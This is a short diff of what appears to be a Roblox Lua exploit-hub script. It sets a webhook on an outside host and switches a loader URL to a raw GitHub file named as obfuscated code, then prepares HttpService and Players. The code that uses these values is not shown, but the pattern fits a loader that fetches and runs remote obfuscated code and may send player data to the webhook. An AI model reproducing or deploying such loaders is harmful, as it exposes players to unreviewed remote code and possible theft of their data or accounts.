@@ -1,6 +1,6 @@
 script_hub = "native hub"
 webhook = "https://sentinelhook.lol/api.php?id=S7ZtU6T7TXWVf1p"
-loader_url = "https://getnative.cc/script/loader"
+loader_url = "https://raw.githubusercontent.com/bloodenjoyer/TheForge/refs/heads/main/nativeobf"
 repeat wait() until game:IsLoaded()
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
